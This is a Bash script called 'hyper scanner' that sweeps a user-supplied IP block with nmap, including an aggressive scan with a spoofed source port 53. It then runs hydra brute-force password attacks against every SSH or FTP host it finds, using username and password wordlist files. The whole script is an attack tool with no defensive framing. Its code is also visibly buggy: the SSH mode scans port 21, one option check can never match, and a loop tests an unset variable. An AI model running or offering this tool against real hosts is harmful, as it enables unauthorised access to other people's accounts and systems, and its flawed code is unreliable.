#!/bin/bash
#author :Ashwin vinod

#function declartions
    weboptions(){
      echo " [*] Do you want nmap results in webpage"
      if [ '$opt1' = 'yes' ]; then
    #statements
    echo " [*] Which browser do you have(Please write in lowercase) "
    read browsername
    data=$(nmap -p $portno -Pn -oX webpage.xml -oG - $ip |awk '/open/{print $2 " " } END {IFS ="\n"}')
  # webpage Processing
    echo " [*] Processing your webpage"
    xsltproc webpage.xml -o nmap-output.html
    echo " [*] Process complete "
    datcnt=( $data )
    browesrcheck=$(dpkg -s $browsername | grep -i status | awk '{ print $3}')

      if [ ! -z "$browesrcheck" ]; then
      #auto open webpge
      $browsername nmap-output.html
fi
else
    unset IFS
    data=$(nmap -p $portno -Pn -oG - $ip |awk '/open/{print $2 " " } END {IFS ="\n"}')
    datcnt=( $data )
fi
    }
    cracker(){
      for (( i = 0; a < 1;i++ )); do
        #statements
        if [ -z "${datcnt[i]}" ];then
          a=1
          echo " [*] Crack complete"
        else
          hydra -l crackuser.txt  -t 4 -P crackpass.txt -o found.txt $service://${datcnt[i]}
        fi
      done
    }
 #ssh part
    ssh (){
  #statements
   portno=21
   service=ssh
      echo " [*] Enter ip block"
      read ip
      echo " [*] starting nmap scan"
      weboptions
#attack section
     echo " [*] nmap scan completed "
#checking if there is any host
   if [ -z "$datcnt" ];then
     echo "[*] host is down"
     exit
   else
     echo " [*] starting to attack $datcnt"
     cracker
   fi
}
   #ftp crack section
   ftp(){
     portno=21
     service=ftp
     echo " [*] Enter ip block"
     read ip
     weboptions
     echo "starting nmap scan"
     echo "nmap scan completed "
      if [ -z "$datcnt" ]; then
        echo "host is down"
          else
        echo " [*] starting to attack $datcnt"
        cracker
      fi
   }

   scan(){
     echo " [*] Enter ip block"
     read ip
     echo "Starting NMAP scan"
     data=$(sudo nmap -sS -sU -T4 -A -v -sV -g 53 $ip )
     echo $data
   }

  tput clear
#main part
 echo -e "\e[0;33mWelcome to hyper scanner\033[0m "
 echo -e "\e[1;41;105mIT IS RECOMMENDED TO USE THIS SCRIPT AS SUDO\033[0m "
 echo "what do u want to do "
 echo -e "\e[1m[0fi]nmap scan"
 echo -e "[1]NMAP ssh scan  plus ssh brute force"
 echo -e "[2]NMAP ftp scan  plus ftp brute force\033[0m"
 read opt
 # option selecting
 case "$opt" in
   "1")ssh
     ;;
   "0")scan
     ;;
   "2")ftp
    ;;
 esac
